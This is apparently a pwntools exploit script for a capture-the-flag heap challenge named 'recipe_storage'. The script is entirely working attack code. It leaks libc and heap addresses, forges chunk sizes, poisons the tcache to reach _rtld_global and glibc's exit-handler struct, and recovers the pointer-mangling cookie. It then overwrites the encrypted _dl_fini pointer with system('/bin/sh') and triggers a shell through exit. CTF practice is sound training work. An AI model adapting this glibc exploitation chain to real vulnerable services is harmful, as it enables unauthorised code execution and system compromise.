#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF("recipe_storage_patched")


gs = '''
c
'''

def ror64(x, n):
    return ((x >> n) | (x << (64 - n))) & (1 << 64) - 1

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def rol64(x, n):
    return rol(x, n, 64)

def ptr_mangle(decrypted, cookie):
    return rol64(decrypted ^ cookie, 0x11)

def get_cookie(encrypted, decrypted):
    return ror64(encrypted, 0x11) ^ decrypted


def mangle(home, target):
    return (home >> 12) ^ target

def malloc(index: int, size: int, payload: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", str(index).encode())
    io.sendafter(b"> ", payload)

def free(index: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(index).encode())

def edit(index: int, payload: bytes):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendafter(b"> ", payload)

def puts(index: int):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(index).encode())
    leak = io.recvline().strip(b"\n")
    return leak



context.arch = 'amd64'

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, aslr=False)
    if args.REMOTE:
        return remote("recipe-storage.challs.brunnerne.xyz", 31000)
    else:
        return process(elf.path, close_fds=False)

#shellcode = asm('\n'.join([
    
#]))


io = start()

malloc(0, 0x420, b"A"*0x60)
malloc(1, 0x20, b"B")
free(0)
malloc(0, 0x420, b"A")

leak = puts(0)
leak = bytearray(leak)
leak[0] = 0x20
leak = u64(leak.ljust(8,b"\x00"))
libc_leak = leak
print("leak:", hex(leak))
libc = leak - 0x203b20
print("libc:", hex(libc))

malloc(0, 0x840, b"A"*0x840)

malloc(1, 0x60, b"A")
malloc(2, 0x60, b"B")
malloc(3, 0x60, b"C")

# Create a fake 0x5c0 size field in here
# and create another beginning fake chunk
p = b"A"*64
p += p64(0x00)
p += p64(0x71)
malloc(4, 0x60, p)

p = b"H"*64
p += p64(0)
p += p64(0x71)
malloc(5, 0x60, p)


free(0)

malloc(0, 0x420, b"C"*0x50)

p = b"Z"*0x428

edit(0, p)

malloc(6, 0x410, b"V"*0x410)

# Overwrite the size field of chunk6
# by using chunk0 right behind chunk6

p = b"D"*0x420
p += p64(0) # chunk 0 itself is 0 since still allocated
p += p16(0x5b1 + 0x10) # remember prev in use (chunk0 is in use)
edit(0, p)

free(6)
input("stop")

free(1)

p = b"G"*0x420
malloc(6, 0x5b0, p)

leak = puts(6)[0x420:0x428]
leak = u64(leak.ljust(8,b"\x00"))
print("leak hex:",hex(leak))
heap = leak << 12
print("heap base:",hex(heap))

p = b"G"*0x410
p += p64(0)
p += p64(0x71)
edit(6,p)

malloc(1, 0x60, b"A")

free(2)
free(1)

# addr of tcache chunk we want to overwrite
home = heap + 0xf50
nptl = libc + 0x2046b8 - 24 # nptl (contains linker ptr (rtld)). Allocate a little before
addr = mangle(home, nptl)

free(6)

p = b"N"*0x410
p += p64(0)
p += p64(0x71)
p += p64(addr)
malloc(6, 0x5b0, p)

malloc(7, 0x60, b"A")

p = b"A"*25
malloc(8, 0x60, p)

leak = puts(8)
leak = leak[25:24+8]
leak = u64(leak.ljust(8,b"\x00"))
_rtld_global_leak = leak

# shift address 8 bits left to accomodate for the missing '00' in LSB
_rtld_global = _rtld_global_leak << 8
print("_rtld_global_leak:",hex(_rtld_global_leak))
print("_rtld_global:",hex(_rtld_global))

linker = _rtld_global - 0x38000
print("linker base:",hex(linker))

# dl_fini is a function the linker
_dl_fini = linker + 0x5380
print("_dl_fini:",hex(_dl_fini))

# Now we need to leak the encrypted _dl_fini from the initial struct
# and then we can calculate
# the 'linker cookie' which is used to encrypt linker function ptrs
# in order to make it harder for an attacker to make this kind of attack
# by directly overwriting function ptrs

# Allocate some extra chunks we can use
malloc(10, 0x60, b"A")
malloc(11, 0x60, b"B")
malloc(12, 0x60, b"C")

free(10)
free(7) # same as before

initial = libc + 0x204fc0 # contains encryped _dl_fini (which is a linker function)
print("initial (contains enc dl_fini):",hex(initial))
home = heap + 0x7f0 # same as before
target = initial
addr = mangle(home, target)

# Use the 0x5c0 chunk again
free(6)

p = b"N"*0x410
p += p64(0)
p += p64(0x71)
p += p64(addr)
malloc(6, 0x5b0, p)

# write 24 A's to cover the gap down to enc _dl_fini
p = b"A"*24

malloc(7, 0x60, b"B")
malloc(14, 0x60, p)

# leak the encrypted _dl_fini
leak = puts(14)
leak = leak[24:24+8]
leak = u64(leak.ljust(8,b"\x00"))
enc_dl_fini = leak

# print the values and calculate the linker cookie value
print("enc_dl_fini:", hex(enc_dl_fini))
l_cookie = get_cookie(enc_dl_fini, _dl_fini)
print("l_cookie:",hex(l_cookie))

# since we cannot edit all the way to initial+32 because of the strlen
# function, we need to alloc a new tcache chunk on top of the old one
# We cannot free chunk 14 since it will kill the program

free(12)
free(7)

free(6)

p = b"N"*0x410
p += p64(0)
p += p64(0x71)
p += p64(addr)
malloc(6, 0x5b0, p)

binsh = libc + 0x1cb42f
system = libc + 0x58750

# encrypt system
enc_system = ptr_mangle(system, l_cookie)

# restore the values at initial and also overwrite enc dl_fini with enc system
# first arg to system will be taken from initial+32 - does not need to be encryped
# to give overview
p = p64(0) # initial+0
p += p64(1) # initial+8
p += p64(4) # initial+16
p += p64(enc_system) # initial+24
p += p64(binsh) # initial+32

malloc(2, 0x60, b"A")
malloc(3, 0x60, p)

# call exit
io.sendlineafter(b"> ", b"5")

io.interactive()
